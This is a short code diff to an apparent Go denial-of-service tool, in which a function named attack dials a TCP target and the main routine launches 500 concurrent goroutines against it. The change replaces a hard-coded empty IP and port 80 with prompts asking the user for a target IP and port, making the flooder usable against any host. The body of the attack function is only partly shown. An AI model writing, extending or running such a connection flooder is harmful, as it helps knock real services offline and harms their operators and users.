@@ -11,6 +11,7 @@ type address struct {
 }
 
 func attack(target_address address) {
+
 	target := target_address.ip + ":" + target_address.port
 	conn, err := net.Dial("tcp", target)
 	if err != nil {
@@ -35,9 +36,10 @@ func attack(target_address address) {
 
 func main() {
 	var target address
-	target.ip = ""
-	target.port = "80"
-	// Connect to the server
+	fmt.Print("Enter target IP: ")
+	fmt.Scanln(&target.ip)
+	fmt.Print("Enter target port: ")
+	fmt.Scanln(&target.port)
 	fmt.Println("Executing attack...")
 	for i := 0; i < 500; i++ {
 		go attack(target)
